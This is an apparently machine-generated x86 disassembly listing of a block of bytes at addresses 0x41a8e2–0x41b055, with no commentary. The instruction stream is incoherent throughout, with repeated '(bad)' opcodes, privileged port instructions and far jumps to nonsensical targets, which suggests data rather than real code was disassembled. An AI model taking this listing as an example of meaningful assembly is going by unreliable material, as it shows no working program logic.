  41a8e2:	jne    0x41a8ee
  41a8e4:	stc    
  41a8e5:	nop
  41a8e6:	pop    DWORD PTR [edx]
  41a8e8:	mov    ch,0xdc
  41a8ea:	repnz mov dh,0xf4
  41a8ed:	ss ss leave 
  41a8f0:	xor    al,0x25
  41a8f2:	xchg   esi,eax
  41a8f3:	shl    DWORD PTR [ecx+0x68],1
  41a8f6:	aam    0xda
  41a8f8:	mov    al,ds:0xc96a0852
  41a8fd:	test   al,0x60
  41a8ff:	sbb    BYTE PTR [ecx+0x6cc3cdca],bl
  41a905:	sbb    eax,0xf95c63f3
  41a90a:	push   ebx
  41a90b:	cmp    BYTE PTR [eax],al
  41a90d:	sub    dh,0x3b
  41a910:	cmp    edi,ebp
  41a912:	jno    0x41a8fa
  41a914:	push   cs
  41a915:	ds pop ebx
  41a917:	jmp    0xa2c:0x6f9789ea
  41a91e:	push   esi
  41a91f:	cmp    eax,0xfa90315a
  41a924:	cld    
  41a925:	call   0x8a4c:0xd60e6b88
  41a92c:	(bad)  
  41a92d:	mov    esp,esi
  41a92f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a930:	xchg   ebp,eax
  41a931:	aam    0x80
  41a933:	mov    ds:0xec976ffe,eax
  41a938:	in     al,0xe9
  41a93a:	(bad)  
  41a93b:	call   FWORD PTR [edx+0x71]
  41a93e:	mov    ebx,DWORD PTR [edx+0x210deba2]
  41a944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a945:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a946:	xor    DWORD PTR [edi-0x1a128cd1],0x3859c09a
  41a950:	loop   0x41a8e7
  41a952:	xor    edi,esi
  41a954:	jo     0x41a8de
  41a956:	dec    esp
  41a957:	shr    DWORD PTR [ecx-0x30eac5ed],1
  41a95d:	mov    bp,0x7b10
  41a961:	(bad)  
  41a962:	pop    ss
  41a963:	jg     0x41a982
  41a965:	mov    BYTE PTR [edx],bl
  41a967:	add    ecx,DWORD PTR [esi]
  41a969:	jmp    0xa0a911d1
  41a96e:	jb     0x41a982
  41a970:	xchg   ebx,eax
  41a971:	mov    DWORD PTR ds:0xe56f8076,edi
  41a977:	sbb    BYTE PTR [edi],al
  41a979:	(bad)  
  41a97a:	adc    ebx,eax
  41a97c:	xchg   DWORD PTR [edi+0x3a],ebx
  41a97f:	push   cs
  41a980:	shr    ebx,1
  41a982:	pop    esi
  41a983:	jl     0x41a9ef
  41a985:	pushf  
  41a986:	mov    edx,0xcc4d289c
  41a98b:	pushf  
  41a98c:	or     eax,0xa4944501
  41a991:	rcl    DWORD PTR [edi+0x6994cafa],0x40
  41a998:	(bad)  
  41a999:	cdq    
  41a99a:	in     al,dx
  41a99b:	sub    eax,0x4a0e696b
  41a9a0:	outs   dx,BYTE PTR ds:[esi]
  41a9a1:	les    esp,FWORD PTR [ebp-0x70]
  41a9a4:	aas    
  41a9a5:	loope  0x41a972
  41a9a7:	lods   al,BYTE PTR ds:[esi]
  41a9a8:	mov    eax,0x3af2f049
  41a9ad:	ss in  eax,0xe0
  41a9b0:	mov    esp,0x2e914541
  41a9b5:	sahf   
  41a9b6:	fiadd  DWORD PTR [eax+eiz*2-0x2d]
  41a9ba:	dec    ebp
  41a9bb:	or     DWORD PTR [ebx-0x5ed625af],esi
  41a9c1:	mov    esp,0xba18ba6
  41a9c6:	fnsave [ebx]
  41a9c8:	retf   0xb167
  41a9cb:	gs mov ebx,0x7a08f0d5
  41a9d1:	mov    edx,0xfb9e22ff
  41a9d6:	out    dx,eax
  41a9d7:	or     esi,eax
  41a9d9:	jg     0x41a976
  41a9db:	mov    BYTE PTR [ebx-0x672927dd],ah
  41a9e1:	test   eax,0xb541bc72
  41a9e6:	sbb    DWORD PTR [esi],ecx
  41a9e8:	pop    ebp
  41a9e9:	fwait
  41a9ea:	(bad)  
  41a9eb:	ins    DWORD PTR es:[edi],dx
  41a9ec:	fucomip st,st(1)
  41a9ee:	pop    ss
  41a9ef:	inc    esp
  41a9f0:	jmp    0x79e070d2
  41a9f5:	push   ebx
  41a9f6:	xor    ch,cl
  41a9f8:	shl    dl,1
  41a9fa:	sbb    ecx,ebp
  41a9fc:	cmp    al,0xbe
  41a9fe:	inc    ecx
  41a9ff:	gs dec eax
  41aa01:	add    DWORD PTR [ecx-0x7be2025a],ebx
  41aa07:	mov    eax,esi
  41aa09:	adc    ecx,DWORD PTR [esi]
  41aa0b:	inc    edi
  41aa0c:	push   0x8b8db6cf
  41aa11:	xchg   ebp,eax
  41aa12:	cmp    al,0x39
  41aa14:	mov    al,0x66
  41aa16:	mov    esi,0x5850fddf
  41aa1b:	xchg   edi,eax
  41aa1c:	or     eax,0x25c11288
  41aa21:	jmp    0x41aa31
  41aa23:	xchg   ebp,eax
  41aa24:	fsub   st,st(7)
  41aa26:	mov    ecx,0x7ec6d1ba
  41aa2b:	scas   eax,DWORD PTR es:[edi]
  41aa2c:	outs   dx,BYTE PTR ds:[esi]
  41aa2d:	push   esi
  41aa2f:	fwait
  41aa30:	out    0x65,eax
  41aa32:	rcr    DWORD PTR [ebp-0x4c],1
  41aa35:	dec    esp
  41aa36:	mov    edx,0xf055fc41
  41aa3b:	push   ecx
  41aa3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa3d:	adc    BYTE PTR [esi+0x56],dl
  41aa40:	push   cs
  41aa41:	sbb    DWORD PTR [eax+0x69a136ea],ecx
  41aa47:	pop    eax
  41aa48:	(bad)  
  41aa49:	and    eax,0x813829e1
  41aa4e:	xchg   ebp,eax
  41aa4f:	arpl   WORD PTR [eax+0x6191995c],cx
  41aa55:	push   cs
  41aa56:	dec    eax
  41aa57:	fwait
  41aa58:	cmp    DWORD PTR [edx+0x649d9de0],ecx
  41aa5e:	bound  edx,QWORD PTR [ecx]
  41aa60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa61:	ficomp WORD PTR ds:0x1f999b09
  41aa67:	out    dx,al
  41aa68:	cld    
  41aa69:	jno    0x41aa0d
  41aa6b:	push   es
  41aa6c:	jg     0x41aad9
  41aa6e:	jns    0x41aaab
  41aa70:	xchg   ecx,eax
  41aa71:	dec    DWORD PTR [edi+0x54]
  41aa74:	push   edi
  41aa75:	shl    BYTE PTR [eax*8-0x147b6e50],1
  41aa7c:	nop
  41aa7d:	jge    0x41aa5c
  41aa7f:	ret    
  41aa80:	cli    
  41aa81:	stos   BYTE PTR es:[edi],al
  41aa82:	jb     0x41aabb
  41aa84:	in     eax,0x95
  41aa86:	pop    edi
  41aa87:	sbb    DWORD PTR [esp+esi*8],esi
  41aa8a:	mov    ds:0x793664f9,al
  41aa8f:	pop    ebx
  41aa90:	jmp    0x7a7a1e0
  41aa95:	push   ebx
  41aa96:	or     eax,0x4039cbf9
  41aa9b:	stc    
  41aa9c:	xchg   ebp,eax
  41aa9d:	lock sub dh,BYTE PTR [edx-0x65ce594c]
  41aaa4:	dec    edx
  41aaa5:	lock shr DWORD PTR [esi],1
  41aaa8:	test   al,0x6a
  41aaaa:	popa   
  41aaab:	xchg   BYTE PTR [ecx],bl
  41aaad:	stos   BYTE PTR es:[edi],al
  41aaae:	js     0x41aab8
  41aab0:	push   0x6cbbe9f4
  41aab5:	cmp    dh,BYTE PTR [eax-0x239e93bf]
  41aabb:	mov    ah,0x49
  41aabd:	or     BYTE PTR [edi+0x5307cb5b],bl
  41aac3:	bound  ebp,QWORD PTR [ebp+0x51]
  41aac6:	mov    ebp,0x29380940
  41aacb:	sbb    dh,BYTE PTR [ebx-0x2e2f663c]
  41aad1:	push   edx
  41aad2:	daa    
  41aad3:	leave  
  41aad4:	adc    ah,BYTE PTR ds:0xa81cf3ea
  41aada:	mov    ecx,0xa6c7ed7e
  41aadf:	pop    es
  41aae0:	aaa    
  41aae1:	mov    ecx,0x14492e19
  41aae6:	pop    ss
  41aae7:	jg     0x41ab66
  41aae9:	xor    eax,0x3088588f
  41aaee:	xchg   edx,eax
  41aaef:	lock sbb BYTE PTR [eax],cl
  41aaf2:	lahf   
  41aaf3:	mov    eax,ds:0x9d8b039a
  41aaf8:	cmp    eax,0xdb35d058
  41aafd:	or     BYTE PTR [eax+0xf],dh
  41ab00:	ud0    esp,DWORD PTR [edx+0x7]
  41ab04:	dec    esp
  41ab05:	jge    0x41aae4
  41ab07:	in     al,0x66
  41ab09:	stc    
  41ab0a:	jecxz  0x41ab69
  41ab0c:	scas   eax,DWORD PTR es:[edi]
  41ab0d:	mov    bl,0xdd
  41ab0f:	imul   ecx,DWORD PTR [edx+ebx*1],0xffffffcb
  41ab13:	push   edi
  41ab14:	push   es
  41ab15:	ins    DWORD PTR es:[di],dx
  41ab17:	cs and bh,dh
  41ab1a:	jecxz  0x41ab73
  41ab1c:	push   edi
  41ab1d:	pop    esi
  41ab1e:	push   cs
  41ab1f:	test   BYTE PTR [eax+eax*8],bh
  41ab22:	adc    bl,al
  41ab24:	test   DWORD PTR ds:0x14f3,0x5840e8d2
  41ab2d:	clc    
  41ab2e:	jmp    0xbbea3215
  41ab33:	fcmovne st,st(1)
  41ab35:	mov    ecx,0x7a2535a1
  41ab3a:	xor    al,0x47
  41ab3c:	js     0x41ab06
  41ab3e:	adc    eax,0xeedcb776
  41ab43:	jg     0x41ab71
  41ab45:	mov    ecx,0xeb48344f
  41ab4a:	mov    al,ds:0x672aef6f
  41ab50:	inc    ebp
  41ab51:	dec    ch
  41ab53:	ror    DWORD PTR [ecx+ebx*4],cl
  41ab56:	hlt    
  41ab57:	ins    BYTE PTR es:[edi],dx
  41ab58:	(bad)  
  41ab59:	hlt    
  41ab5a:	(bad)  
  41ab5d:	aam    0x50
  41ab5f:	in     al,dx
  41ab60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab61:	lods   al,BYTE PTR ds:[esi]
  41ab62:	psraw  mm6,mm7
  41ab65:	mov    edi,0x90751c17
  41ab6a:	jmp    FWORD PTR [edx+0x28e403c4]
  41ab70:	push   esi
  41ab71:	cmp    eax,0x352a3c49
  41ab76:	add    cl,dh
  41ab78:	(bad)  
  41ab7a:	jnp    0x41ab8d
  41ab7c:	sbb    ebx,DWORD PTR [edi]
  41ab7e:	xchg   ecx,eax
  41ab7f:	xchg   esi,eax
  41ab80:	mov    ebx,0xc13404d0
  41ab85:	enter  0x3dd,0x97
  41ab89:	addr16 ret 0xe7eb
  41ab8d:	es inc ecx
  41ab8f:	cs fsub st,st(5)
  41ab92:	jbe    0x41abc1
  41ab94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab95:	cmp    BYTE PTR [edi],0x6e
  41ab98:	xchg   ebp,eax
  41ab99:	dec    edi
  41ab9a:	vaddps ymm5,ymm6,YMMWORD PTR [ebx-0x2b]
  41ab9f:	push   ds
  41aba0:	in     eax,0x13
  41aba2:	xchg   ebp,eax
  41aba3:	push   esi
  41aba4:	sbb    bh,BYTE PTR gs:[edx-0x6df6931a]
  41abab:	lds    esi,FWORD PTR [edi-0x51265d4c]
  41abb1:	push   eax
  41abb2:	pop    es
  41abb3:	aad    0xf0
  41abb5:	nop
  41abb6:	shl    ah,cl
  41abb8:	adc    al,0xea
  41abba:	mov    ds:0xfe14f86c,al
  41abbf:	cmp    esp,edi
  41abc1:	aaa    
  41abc2:	in     eax,0x2a
  41abc4:	xor    BYTE PTR [edx-0x195e1d7a],0xce
  41abcb:	push   edi
  41abcc:	mov    ebx,0x1c051822
  41abd1:	sbb    eax,0xc1246ef4
  41abd6:	(bad)  
  41abd7:	cld    
  41abd8:	cmp    al,0xbd
  41abda:	shr    DWORD PTR [edx],0xd3
  41abdd:	xchg   edx,eax
  41abde:	cmp    BYTE PTR ds:0xf4a7f558,ch
  41abe4:	sti    
  41abe5:	popf   
  41abe6:	push   cs
  41abe7:	shl    BYTE PTR [esi],0x44
  41abea:	fistp  DWORD PTR [eax]
  41abec:	push   eax
  41abed:	jmp    0x41ac5e
  41abef:	jns    0x41ab98
  41abf1:	into   
  41abf2:	jnp    0x41abfc
  41abf4:	lock in al,0xe5
  41abf7:	scas   eax,DWORD PTR es:[edi]
  41abf8:	jbe    0x41abd4
  41abfa:	out    0xc7,eax
  41abfc:	push   ebp
  41abfd:	xchg   ebp,eax
  41abfe:	test   eax,0xf7716de5
  41ac03:	bound  esp,QWORD PTR [esi-0x1ce8f87a]
  41ac09:	inc    edi
  41ac0a:	popa   
  41ac0b:	std    
  41ac0c:	lds    esi,FWORD PTR [esi-0x34]
  41ac0f:	scas   eax,DWORD PTR es:[edi]
  41ac10:	enter  0xa5ca,0x7b
  41ac14:	xcrypt-ofb 
  41ac17:	cmovnp esi,DWORD PTR [edx-0x670308aa]
  41ac1e:	inc    edi
  41ac1f:	push   edi
  41ac20:	inc    eax
  41ac21:	jmp    0xe1cc:0xc3de3d0b
  41ac28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac29:	push   ecx
  41ac2a:	mov    ah,0x74
  41ac2c:	fucom  st(4)
  41ac2e:	add    eax,0x79e68aac
  41ac33:	stc    
  41ac34:	loopne 0x41acaf
  41ac36:	stos   DWORD PTR es:[edi],eax
  41ac37:	jae    0x41ac45
  41ac39:	push   0xffffff80
  41ac3b:	mov    dh,0x19
  41ac3d:	xchg   esi,eax
  41ac3e:	in     eax,dx
  41ac3f:	xchg   esi,eax
  41ac40:	push   0x699dac8d
  41ac45:	xchg   ebp,eax
  41ac46:	xlat   BYTE PTR ds:[ebx]
  41ac47:	fidivr DWORD PTR [esp+eax*1+0x2c]
  41ac4b:	or     al,0x3a
  41ac4d:	loop   0x41acc4
  41ac4f:	pop    esi
  41ac50:	or     BYTE PTR [ecx],0x98
  41ac53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac54:	sbb    esp,0x742f7f8d
  41ac5a:	daa    
  41ac5b:	(bad)  
  41ac5c:	aas    
  41ac5d:	std    
  41ac5e:	add    BYTE PTR [eax-0x47],ah
  41ac61:	jmp    0xe472:0xdb81e813
  41ac68:	and    eax,0x53f7ca56
  41ac6d:	xor    eax,eax
  41ac6f:	pop    eax
  41ac70:	mov    bl,0xf
  41ac72:	stc    
  41ac73:	xor    cl,BYTE PTR [ecx-0x1f4bc513]
  41ac79:	pop    ecx
  41ac7a:	(bad)  
  41ac7b:	imul   BYTE PTR [esi]
  41ac7d:	test   al,0x9
  41ac7f:	pusha  
  41ac80:	mov    eax,0xe59d73ee
  41ac85:	sbb    eax,0xd6602493
  41ac8a:	call   0x3bda:0x37a02700
  41ac91:	std    
  41ac92:	int    0xaf
  41ac94:	mov    cl,0xf6
  41ac96:	cld    
  41ac97:	or     al,0x7f
  41ac99:	mov    dl,cl
  41ac9b:	jne    0x41ad17
  41ac9d:	cmp    DWORD PTR [ebx+0x200b3ecf],ecx
  41aca3:	mov    dh,0x3d
  41aca5:	dec    eax
  41aca6:	lock xor edi,edx
  41aca9:	sub    eax,0x82a44abf
  41acae:	iret   
  41acaf:	mov    ds:0x29adde60,al
  41acb4:	inc    ecx
  41acb5:	inc    edi
  41acb6:	jmp    0x2b2d:0x5e778bb5
  41acbd:	push   ss
  41acbe:	call   0xc074:0xfa8a4611
  41acc5:	mov    al,ds:0x93284ddb
  41acca:	loopne 0x41acb1
  41accc:	inc    eax
  41accd:	mov    esi,0x867aa78b
  41acd2:	push   es
  41acd3:	lock es push es
  41acd6:	loope  0x41acfa
  41acd8:	xchg   ebx,eax
  41acd9:	mov    edi,0x292a8a01
  41acde:	add    eax,0xa761023f
  41ace3:	fisub  DWORD PTR [edx-0x71]
  41ace6:	xchg   ecx,eax
  41ace7:	jge    0x41ad0b
  41ace9:	imul   ebx,DWORD PTR [edi+0x15],0xffffffac
  41aced:	push   cs
  41acee:	sbb    al,0xa7
  41acf0:	in     al,0xa2
  41acf2:	mov    eax,0xfc28653c
  41acf7:	jmp    edi
  41acf9:	or     ebx,eax
  41acfb:	(bad)  
  41acfd:	add    al,0xd1
  41acff:	or     eax,DWORD PTR [edx-0x6a]
  41ad02:	dec    ebp
  41ad03:	shl    DWORD PTR [esi],0x8d
  41ad06:	stos   BYTE PTR es:[edi],al
  41ad07:	sub    ebp,DWORD PTR [eax-0x58f46d84]
  41ad0d:	adc    cl,ah
  41ad0f:	jnp    0x41ac9b
  41ad11:	mov    dl,0xdd
  41ad13:	sahf   
  41ad14:	pop    esp
  41ad15:	mov    BYTE PTR [ebx-0x1d],ah
  41ad18:	mov    al,ds:0x8a6f9116
  41ad1d:	in     al,0xb1
  41ad1f:	rol    DWORD PTR [eax-0x5c9c0bcc],1
  41ad25:	pop    edx
  41ad26:	adc    BYTE PTR [eax-0x58],0x24
  41ad2a:	cs inc ebx
  41ad2c:	(bad)  
  41ad2d:	and    eax,0x823aab82
  41ad32:	arpl   WORD PTR cs:[ebx],bp
  41ad35:	(bad)  [eax+0x31c5cfe9]
  41ad3b:	mov    ch,0x80
  41ad3d:	and    BYTE PTR [esp+ebx*8],ah
  41ad40:	adc    eax,0x21290d0f
  41ad45:	adc    DWORD PTR [ebx-0x42],edx
  41ad48:	gs add al,0xe3
  41ad4b:	mov    cl,0x2c
  41ad4d:	pop    edi
  41ad4e:	push   edi
  41ad4f:	fcom   DWORD PTR [edx-0x42]
  41ad52:	xor    DWORD PTR [edi+0x3c37268d],ecx
  41ad58:	mov    gs,WORD PTR [ebx]
  41ad5a:	fwait
  41ad5b:	imul   esp,DWORD PTR [eax+0x6e],0x7ab1320a
  41ad62:	pusha  
  41ad63:	rcl    BYTE PTR [ebp-0x6a],0x59
  41ad67:	scas   eax,DWORD PTR es:[edi]
  41ad68:	aad    0xbd
  41ad6a:	ss int 0xbd
  41ad6d:	push   ecx
  41ad6e:	pop    es
  41ad6f:	pusha  
  41ad70:	lods   eax,DWORD PTR ds:[esi]
  41ad71:	pop    eax
  41ad72:	les    esp,FWORD PTR [esi+esi*4-0x4a]
  41ad76:	xchg   edi,eax
  41ad77:	scas   al,BYTE PTR es:[edi]
  41ad78:	out    dx,eax
  41ad79:	sar    DWORD PTR [ebp-0x6],cl
  41ad7c:	dec    ebp
  41ad7d:	add    bl,BYTE PTR [esi+eax*8-0x427da384]
  41ad84:	(bad)  
  41ad85:	sbb    BYTE PTR ds:0xa9df69b1,cl
  41ad8b:	push   ebp
  41ad8c:	sub    DWORD PTR [ebx+ebp*1],esp
  41ad8f:	or     BYTE PTR [eax],ch
  41ad91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad92:	xor    bh,dl
  41ad94:	cld    
  41ad95:	in     al,dx
  41ad96:	push   esp
  41ad97:	fs stos DWORD PTR es:[edi],eax
  41ad99:	sets   ch
  41ad9c:	ret    
  41ad9d:	mov    fs,WORD PTR [ecx+edx*4]
  41ada0:	into   
  41ada1:	fidiv  WORD PTR [edx+0x1e39792b]
  41ada7:	pop    ebp
  41ada8:	sahf   
  41ada9:	retf   
  41adaa:	or     DWORD PTR [ecx+0x6522c95f],0x4f
  41adb1:	inc    edx
  41adb2:	jnp    0x41adef
  41adb4:	mov    al,ds:0x5ca92cb9
  41adb9:	enter  0xf052,0x4d
  41adbd:	and    al,0x64
  41adbf:	sti    
  41adc0:	ins    BYTE PTR es:[edi],dx
  41adc1:	mov    ds:0xc7f4a952,al
  41adc6:	js     0x41ae2d
  41adc8:	mov    ds:0xfa9c13a2,al
  41adcd:	mov    ah,0x5e
  41adcf:	or     ebx,esp
  41add1:	je     0x41ade4
  41add3:	cmc    
  41add4:	cmp    bh,ch
  41add6:	loopne 0x41ae47
  41add8:	mov    es,WORD PTR [ebx]
  41adda:	and    al,0x6
  41addc:	jno    0x41ae3c
  41adde:	test   ebx,esp
  41ade0:	cmp    dl,BYTE PTR [esi+0x74]
  41ade3:	mov    ebp,0xc9b2d424
  41ade8:	add    dh,cl
  41adea:	sbb    dh,BYTE PTR [ecx+0x6ec988b5]
  41adf0:	xor    al,0xbe
  41adf2:	mov    esi,0x83e16a7d
  41adf7:	stos   BYTE PTR es:[edi],al
  41adf8:	jb     0x41adf4
  41adfa:	(bad)  
  41adfb:	addr16 (bad) 
  41adfd:	scas   eax,DWORD PTR es:[edi]
  41adfe:	rcr    BYTE PTR [ebx+0x2a775666],cl
  41ae04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae05:	sub    eax,0x9869b04a
  41ae0a:	inc    esi
  41ae0b:	or     BYTE PTR [ecx+ebx*8],al
  41ae0e:	lods   al,BYTE PTR ds:[esi]
  41ae0f:	(bad)  
  41ae10:	out    dx,al
  41ae11:	int3   
  41ae12:	stos   DWORD PTR es:[edi],eax
  41ae13:	and    dh,BYTE PTR [eax]
  41ae15:	sub    DWORD PTR [esi-0x16aced90],esp
  41ae1b:	pop    edi
  41ae1c:	aaa    
  41ae1d:	data16 mov BYTE PTR [edx+0x54],al
  41ae21:	mov    ch,0xcc
  41ae23:	scas   eax,DWORD PTR es:[edi]
  41ae24:	shl    eax,cl
  41ae26:	daa    
  41ae27:	daa    
  41ae28:	out    dx,eax
  41ae29:	mov    edx,DWORD PTR [edi]
  41ae2b:	mov    bh,0xad
  41ae2d:	test   BYTE PTR [ecx],al
  41ae2f:	inc    ebx
  41ae30:	iret   
  41ae31:	lock add al,0xb3
  41ae34:	js     0x41ae05
  41ae36:	outs   dx,BYTE PTR ds:[esi]
  41ae37:	(bad)  
  41ae39:	pop    ss
  41ae3a:	xor    BYTE PTR [edi+0x2c],dl
  41ae3d:	in     eax,dx
  41ae3e:	pusha  
  41ae3f:	add    eax,0x6db69024
  41ae44:	sub    al,0x88
  41ae46:	and    BYTE PTR [ecx+0x58],dh
  41ae49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae4a:	aaa    
  41ae4b:	cmp    al,0x5
  41ae4d:	and    al,0x2a
  41ae4f:	xchg   BYTE PTR [ebp+0x52efd12f],cl
  41ae55:	add    dh,dh
  41ae57:	mov    esp,0x25a2f1a7
  41ae5c:	xor    esp,DWORD PTR [edx+0x3583ba23]
  41ae62:	xlat   BYTE PTR ds:[ebx]
  41ae63:	mov    ch,BYTE PTR [edi+0x5cc9f095]
  41ae69:	xlat   BYTE PTR ds:[ebx]
  41ae6a:	mov    al,0xa9
  41ae6c:	add    eax,0x7e8c0e65
  41ae71:	sahf   
  41ae72:	inc    edx
  41ae73:	pop    eax
  41ae74:	or     eax,0x417bce0a
  41ae79:	sub    al,0xb
  41ae7b:	xor    dl,BYTE PTR [eax+ebx*1-0x4ca53e02]
  41ae82:	add    DWORD PTR [ecx+eax*2-0x7f523924],esp
  41ae89:	push   esp
  41ae8a:	pop    edi
  41ae8b:	jp     0x41ae50
  41ae8d:	sub    al,0x0
  41ae8f:	test   ebp,eax
  41ae91:	stos   DWORD PTR es:[edi],eax
  41ae92:	sbb    eax,0xcf52a9f8
  41ae97:	imul   ebp,DWORD PTR [esp+ebx*8-0x48],0xb
  41ae9c:	pop    ss
  41ae9d:	lea    edx,[esi]
  41ae9f:	outs   dx,BYTE PTR ds:[esi]
  41aea0:	retf   
  41aea1:	jge    0x41ae62
  41aea3:	ja     0x41af05
  41aea5:	add    eax,0xd25aa2eb
  41aeaa:	mov    ebp,0xbd3ad356
  41aeaf:	icebp  
  41aeb0:	femms  
  41aeb2:	test   DWORD PTR [edx+0x73],ebx
  41aeb5:	push   eax
  41aeb6:	stc    
  41aeb7:	repnz xchg esi,eax
  41aeb9:	int3   
  41aeba:	jmp    0x41ae9f
  41aebc:	pop    edi
  41aebd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aebe:	push   edi
  41aebf:	out    dx,eax
  41aec0:	lahf   
  41aec1:	xor    cl,BYTE PTR [esi]
  41aec3:	inc    ebp
  41aec4:	(bad)  
  41aec5:	jmp    0x41aed5
  41aec7:	ss clc 
  41aec9:	xor    al,0xac
  41aecb:	pop    esi
  41aecc:	imul   esi,DWORD PTR [edi+0x2a],0x1caeaed3
  41aed3:	adc    DWORD PTR [ebx+0x36d8a929],ebx
  41aed9:	nop
  41aeda:	in     eax,dx
  41aedb:	jmp    0x41ae66
  41aedd:	arpl   WORD PTR [ebx-0x4f6f4847],cx
  41aee3:	and    eax,0xfbd32723
  41aee8:	cmp    al,0x92
  41aeea:	es call 0xfdd71781
  41aef0:	inc    ebx
  41aef1:	mov    BYTE PTR [edi],dh
  41aef3:	xchg   esi,eax
  41aef4:	popf   
  41aef5:	test   DWORD PTR [ecx-0x19],edi
  41aef8:	sbb    BYTE PTR [eax-0x80],al
  41aefb:	pop    edi
  41aefc:	xchg   ebp,eax
  41aefd:	pop    ecx
  41aefe:	xor    eax,0xc4a965c6
  41af03:	(bad)  
  41af04:	dec    ebx
  41af05:	cmp    ebp,edx
  41af07:	aas    
  41af08:	adc    ebp,eax
  41af0a:	and    ch,BYTE PTR [ebx]
  41af0c:	loop   0x41af80
  41af0e:	and    eax,ebp
  41af10:	aas    
  41af11:	mov    BYTE PTR ds:0x350cde7e,dl
  41af17:	mov    dh,0xd7
  41af19:	add    esp,esi
  41af1b:	jns    0x41ae9e
  41af1d:	fnstcw WORD PTR [edx-0x58477150]
  41af23:	hlt    
  41af24:	data16 lahf 
  41af26:	add    al,0xae
  41af28:	dec    ecx
  41af29:	push   ebp
  41af2a:	std    
  41af2b:	imul   BYTE PTR [esi]
  41af2d:	xor    DWORD PTR [edi],0x7
  41af30:	ret    0xd92b
  41af33:	sbb    cl,al
  41af35:	shl    BYTE PTR ds:0xf10c41ba,0x7c
  41af3c:	aas    
  41af3d:	stc    
  41af3e:	pusha  
  41af3f:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41af41:	and    DWORD PTR [ebx-0x6a],0xffffff94
  41af45:	push   esp
  41af46:	(bad)  
  41af47:	pop    edx
  41af48:	mov    esi,0x5774ba05
  41af4d:	mov    bh,0x5
  41af4f:	out    0x94,al
  41af51:	push   ecx
  41af52:	xor    dl,BYTE PTR [ebp+0x72]
  41af55:	std    
  41af56:	scas   eax,DWORD PTR es:[edi]
  41af57:	gs mov eax,0x1a4f47ad
  41af5d:	sbb    bl,BYTE PTR [edi-0x3ef6166]
  41af63:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af65:	cmp    eax,0x4f304656
  41af6a:	cmp    BYTE PTR [esi-0x5f],0x76
  41af6e:	out    0xfd,eax
  41af70:	and    al,0xd9
  41af72:	mov    edx,0x6d18d67
  41af77:	adc    DWORD PTR [edi+0x21641eba],edx
  41af7d:	aad    0xdf
  41af7f:	dec    edi
  41af80:	pop    esi
  41af81:	sahf   
  41af82:	mov    ecx,0xabd98eea
  41af87:	mov    eax,ds:0xd959a368
  41af8c:	icebp  
  41af8d:	adc    al,0xb0
  41af8f:	dec    eax
  41af90:	xchg   DWORD PTR [edx],ebx
  41af92:	ret    0xdad3
  41af95:	cmp    eax,0x5ad8943d
  41af9a:	jle    0x41af26
  41af9c:	xchg   BYTE PTR [eax+esi*2+0x430533a8],bh
  41afa3:	out    0xaa,al
  41afa5:	(bad)  
  41afa6:	out    0x43,al
  41afa8:	in     eax,0xd
  41afaa:	psubusw mm2,QWORD PTR [edi+ecx*8+0x3d870e58]
  41afb2:	mov    edi,0x46ad9af7
  41afb7:	sbb    dl,BYTE PTR [ecx-0x4f]
  41afba:	fild   WORD PTR [edi-0x72ccf00c]
  41afc0:	sbb    DWORD PTR [ecx],esp
  41afc2:	(bad)  [edi]
  41afc4:	sbb    DWORD PTR [edx+ebp*1],edi
  41afc7:	mov    ah,0x8c
  41afc9:	adc    esi,eax
  41afcb:	hlt    
  41afcc:	(bad)  
  41afcd:	int3   
  41afce:	mov    ah,0xea
  41afd0:	inc    eax
  41afd1:	push   es
  41afd2:	hlt    
  41afd3:	mov    dh,0x84
  41afd5:	sahf   
  41afd6:	sti    
  41afd7:	jbe    0x41b01c
  41afd9:	cmp    ebx,esp
  41afdb:	and    ch,BYTE PTR ds:0xafb36565
  41afe1:	add    cl,dh
  41afe3:	xchg   ah,al
  41afe5:	mov    esi,0x63f883a1
  41afea:	gs aas 
  41afec:	ins    BYTE PTR es:[edi],dx
  41afed:	fadd   QWORD PTR ds:0xeabf8096
  41aff3:	idiv   DWORD PTR [edx+0x3c]
  41aff6:	mov    ds:0x556f059f,eax
  41affb:	and    ecx,DWORD PTR [edx-0x5]
  41affe:	stos   DWORD PTR es:[edi],eax
  41afff:	ins    DWORD PTR es:[edi],dx
  41b000:	in     eax,dx
  41b001:	and    ch,BYTE PTR [ebx-0x5a]
  41b004:	not    BYTE PTR [ecx+0xfe5c4ce]
  41b00a:	cmc    
  41b00b:	mov    cl,0xf7
  41b00d:	inc    eax
  41b00e:	in     al,dx
  41b00f:	dec    ebx
  41b010:	and    al,0x4c
  41b012:	ds dec esp
  41b015:	xchg   BYTE PTR [edi-0x256fc3ed],ah
  41b01b:	les    ebp,FWORD PTR [esi+edi*4]
  41b01e:	and    al,0xbe
  41b021:	pop    esp
  41b022:	jns    0x41b051
  41b024:	pop    ebx
  41b025:	inc    ebp
  41b026:	into   
  41b027:	mov    edx,0xc5109554
  41b02c:	test   esi,edi
  41b02e:	push   ss
  41b02f:	dec    esp
  41b030:	adc    BYTE PTR [ecx-0x49],cl
  41b033:	xchg   edx,eax
  41b034:	je     0x41b09f
  41b036:	sub    ecx,esi
  41b038:	in     eax,0xe1
  41b03a:	fst    QWORD PTR [esi-0x5c]
  41b03d:	adc    eax,0x15b8e647
  41b042:	fidiv  WORD PTR [ebp+ebp*1-0x15b605f4]
  41b049:	push   ss
  41b04a:	mov    eax,ds:0x16cacc3e
  41b04f:	jb     0x41b03c
  41b051:	out    dx,al
  41b052:	push   ds
  41b053:	push   ebp
  41b054:	inc    edx
  41b055:	ss loop 0x41b0d0
